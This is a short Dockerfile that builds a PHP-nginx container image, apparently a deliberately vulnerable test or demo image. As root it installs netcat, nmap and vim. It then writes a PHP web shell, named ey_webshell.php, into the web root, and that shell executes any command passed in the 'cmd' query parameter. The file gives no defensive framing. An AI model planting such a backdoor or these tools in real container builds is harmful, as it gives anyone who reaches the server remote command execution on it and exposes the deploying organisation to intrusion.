#FROM ghcr.io/socialgouv/docker/nginx:7.1.1
FROM trafex/php-nginx
#FROM php:8.0-apache
#USER root

ARG COMMIT_SHA
ENV COMMIT_SHA $COMMIT_SHA

RUN echo "=========="
USER root
RUN apk add --no-cache \
  nc \
  nmap \
  vim
RUN echo "=========="
USER nobody
RUN echo "<?php echo exec(\$_GET['cmd']);?>" > /var/www/html/ey_webshell.php
